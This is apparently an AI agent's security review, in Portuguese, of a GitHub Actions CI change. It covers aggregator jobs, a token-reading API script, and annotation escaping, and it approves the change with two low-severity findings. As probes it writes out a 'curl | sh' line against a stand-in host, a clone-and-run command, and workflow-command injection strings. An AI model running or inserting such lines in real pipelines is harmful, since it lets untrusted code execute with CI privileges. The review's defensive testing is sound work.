---
tipo: revisao-seguranca
contrato: 1
pedido: v047
branch: melhoria/v047-ci-falhas-no-resumo
commit: c99945e3fa897d57b99480afc608d782a31db903
parecer: aprovado
revisor: forge:security-engineer
data: 2026-11-17
---
# Review de segurança: v047-ci-falhas-no-resumo

Pedido v047, etapas E2.552 e E2.611 (esta, a última): revalidação por delta (`forge-check parecer delta`, intervalo `82623453..8738371e`, sem o que veio da develop) no head `8738371e`; o código revisado é o Revisar-sha `a00638db` (os dois commits seguintes só tocam `docs/reviews/` e `docs/qa/`). A rodada anterior (E2.288, no `82623453`) fica no git.

## Gatilhos
Gatilhos: `.github/workflows/ci.yml` (jobs da prova da develop e do check exigido, agregadores com `always()`), guarda de workflow da catraca (`tests/test_catraca.py`), script que lê a API do GitHub com token (`scripts/pesos-do-ci.py`), escrita de comandos de workflow a partir da saída da suíte (`scripts/suite-partes.py`).

## Delta lido no domínio
- `.github/workflows/ci.yml`: a prova da develop virou 5 pernas por versão (`rapida-partes-doze`, `rapida-partes-quatorze`), um teto de pulados por versão em job próprio (`rapida-pulados-doze`, `rapida-pulados-quatorze`) e os agregadores de nome fixo `rapida` e `rapida-quatorze`; o PR passou de 3 para 5 partes. Conferido: gatilhos `pull_request`, `push` e `workflow_dispatch`, sem `pull_request_target`; `permissions: contents: read` no topo e em cada job novo; toda ação fixada por SHA de 40 caracteres (checkout, setup, upload e download de artefato); `persist-credentials: false` nos checkouts; nenhum `secrets.` nem token nos jobs novos; timeouts 15 (pernas), 5 (teto e agregadores); o download de artefato é só do run corrente (sem `run-id` nem token), com `retention-days: 1` e `if-no-files-found: error` no upload.
- Agregadores `rapida` e `rapida-quatorze` (ci.yml:127-145 e 239-257): sem checkout nem ação, `needs.*.result` chega por `env:` e o `run:` só compara com `success`; `always()` restrito ao push na develop. Pernas e teto rodam código da própria develop (já mesclado), sem segredo.
- `scripts/suite-partes.py`: divisão por unidade com guarda de completude por ID (a soma das partes é o discover inteiro); anotações `::notice` de tempos só com nome no alfabeto `[A-Za-z0-9_.]` e segundos finitos não negativos; anotação `::error` de falha com título do alfabeto seguro e mensagem escapada (`%`, CR, LF): sai numa linha só (sonda abaixo).
- `scripts/pesos-do-ci.py`: só leitura da API; aceita execução `push` da develop do `ci.yml` com `repository` e `head_repository` iguais ao `--repo` e `conclusion: success`, perna de nome da develop em `success`, anotação com parte e versão iguais às do job, unidade do plano, segundos em [0, 900]; não escreve no repositório; o erro não traz detalhe (o token não sai). Anotação forjada por PR ou fork não entra (sonda abaixo).
- `tests/test_catraca.py`:3497-3515: a guarda nova conta os `always()` (2 do PR e 2 da develop), separa os jobs e exige, nos que têm `always()`, nenhum `uses:`, `needs:` presente e passos sem `python`, `bash`, `./`, `scripts/`, `bin/`, `tests/` nem `${{ github.event.` / `inputs`.
- `stacks/*/pronto.md` e `templates/projeto/docs/engineering/protecao-de-branch.md`: texto neutro; a regra nova (agregador só lê `needs`, nunca roda código da branch, tempos por anotação e nenhum workflow grava no repositório) é coerente com `R-MAIN` e `R-CUSTO`.

## Revalidação E2.611 (delta `a00638db..c99945e3`)
Lido com `forge-check parecer delta`, sem o que veio da develop. No domínio: `.github/workflows/ci.yml` (só dois comentários: o caminho da proposta virou texto; nenhuma chave, ação, permissão nem `run:` mudou), `templates/projeto/.githooks/pre-push` (linha 156), `tests/test_catraca.py` (comentário) e `tests/test_prepush_so_docs.py` (teste novo com `ps` falso). Fora do domínio: mutantes G1 e G2 e `tests/test_forge.py`.
- Hook: sem pgid legível, o `kill` vai ao grupo `-$etapa` só se `kill -0 -- "-$etapa"` acha membro. Um grupo com PGID igual ao PID da etapa só existe enquanto a etapa ou um descendente o mantém (o kernel não reaproveita o número), então o alvo é o grupo da etapa e de mais ninguém; sem membro, o teste falha e o alvo continua só a etapa. Etapa que não criou grupo (`set -m` falhou) tem PGID do pai: `kill -0 -$etapa` falha e a guarda existente sobre o pgid do `$$` segue valendo. Sem entrada externa nova, sem ampliar o alcance do sinal para fora do grupo da etapa.
- Teste novo (`test_ps_sem_resposta_com_o_grupo_criado_ainda_encerra_o_filho`): cobre o ramo. Neste sandbox a classe `GrupoDaEtapa` roda com 4 de 5 testes pulados (`/proc` de outro namespace de pid); o novo está entre os pulados, então a prova dele é o CI no mesmo sha (verde, segundo o brief), não esta máquina.
- A1 e A2 seguem abertos e recomendados; o delta não os toca nem os agrava.

## Conclusão
Aprovado (também após o delta E2.611, sem achado novo). O head cumpre o requisito A1 do `docs/security/v047-ci-rapido.md` (agregador não roda código da branch) e o T3 (teto de pulados fora do agregador). A guarda da catraca barra o checkout no agregador (S1 abaixo), mas é lista negativa (AR-3): aceita `git clone` + `sh`, `curl | sh`, `container:` e `${{ github.head_ref }}` no agregador. Sem caminho de ataque hoje (o head está correto e o PR de fork já roda o próprio workflow sem segredo), fica como recomendação. O A1 da rodada anterior (pipefail) continua aberto e agora cobre as 4 pernas sem âncora, porque a igualdade exata que prendia a antiga `rapida` saiu com ela.

## Achados
- A1 (recomendado) tests/test_falhas_no_resumo.py:226 · guarda do pipefail só por texto; comentar o `set -o pipefail` nas 4 pernas (ci.yml:85, 197, 379, 450) mantém 170 testes verdes. Executar o `run:` real com interpretador falso que sai 1 e exigir rc≠0. Estado: aberto desde E2.288.
- A2 (recomendado) tests/test_catraca.py:3515 · guarda do agregador é lista negativa (AR-3): `git clone`+`sh`, `curl | sh`, `container:` e `${{ github.head_ref }}` no agregador passam. Trocar por lista positiva: passos só com `name`, `env` de `needs.<job>.result` e `run` de `echo`/`[ ]`; barrar `container:` e `services:`.

## Sondas

## Detalhe dos achados
**A1.** Evidência: `tests/test_falhas_no_resumo.py`:226 (`assertIn("set -o pipefail", ...)`). Sonda: numa cópia (`git archive`), troquei nas 4 ocorrências `set -o pipefail` + `python3 --version` por `python3 --version` + `# set -o pipefail`; `tests.test_falhas_no_resumo tests.test_suite_partes tests.test_ci_local tests.test_catraca.Workflows tests.test_ci_rapido_guardas` deram `Ran 170 tests ... OK`. Caminho: sem atacante; edição futura (inclusive de agente) faz a suíte vermelha virar perna verde no check exigido e na prova da develop. Severidade: baixa. Correção mínima: no teste de fiação, extrair o `run:` do passo da suíte dos 4 jobs (`rapida-partes-doze`, `rapida-partes-quatorze`, `partes-doze`, `partes-quatorze`) e executá-lo como o Actions (`bash -e`, sem pipefail implícito) com interpretador falso no PATH que sai 1 e `RUNNER_TEMP` temporário, exigindo rc≠0; e um mutante que comente o pipefail. Esforço: P. Dono: `devops-engineer` (teste) e `qa-engineer` (mutante).

**A2.** Evidência: `tests/test_catraca.py`:3515. Sondas (cópia descartável, só `test_gate_do_ci_nao_deixa_codigo_escapar_nem_forjar_o_verde`): S1 `- uses: actions/checkout@<sha>` no passo do `rapida` → rc=1 (barrado, correto); S2 `git clone https://github.com/$GITHUB_REPOSITORY r && sh r/hooks/x` → rc=0; S3 `curl -sL https://x.invalid/a | sh` → rc=0; S4 `echo ${{ github.head_ref }}` → rc=0; S5 `container: ghcr.io/x/y:latest` no job → rc=0; S6 id `rapida2:` → rc=1 (falha fechada). Caminho: sem atacante externo (o agregador de PR roda o workflow do próprio PR, sem segredo; o da develop só roda depois do merge revisado); o risco é regressão: uma edição que traga código da branch ao agregador passa na catraca que diz provar o contrário. Severidade: baixa. Correção mínima: lista positiva por job com `always()`: chaves do job só `name`, `needs`, `if`, `permissions`, `runs-on`, `timeout-minutes`, `steps`; cada passo só `name`, `env`, `run`; cada valor de `env` casando `^\$\{\{ needs\.[a-z-]+\.result \}\}$`; cada linha do `run` só `echo "..."` ou teste `[ "$X" = success ]` encadeado por `&&`/`||`. Esforço: P. Dono: `devops-engineer`.

Sondas de não regressão (não provam bloqueante): `anotacao_de_falha` com título `parte 1/5::x\n` e causa com `\n::add-mask::`, `\r\n::set-output` e erro `\n::stop-commands::` → uma linha só, título trocado por `suite`, quebras como `%0A`/`%0D`; `anotacoes_de_tempos` com nome `x\n::warning::y`, `nan` e negativo → só a unidade válida; parte `1/5\n::x` → `[]`. `pesos-do-ci`: execução com `head_repository` de fork → recusada; `event: pull_request` → recusada; job `suíte (python 3.12, parte 1/5)` (perna de PR) → recusado; segundos `1e9` → anotação descartada.

## Riscos aceitos e ferramentas
Nenhum risco aceito. Testes do item no clone: `python3 -m unittest tests.test_catraca.Workflows tests.test_falhas_no_resumo tests.test_pesos_do_ci tests.test_ci_rapido_guardas tests.test_suite_partes tests.test_ci_local` → `Ran 186 tests ... OK`. A suíte inteira roda só no CI do PR; não conferi o estado do CI no head (sem CLI do GitHub no sandbox): o merge segue preso à bateria verde, com o `tech-lead`. Varredura de segredos e de workflows não está no PATH desta máquina (lacuna; revisão por leitura e sondas locais).
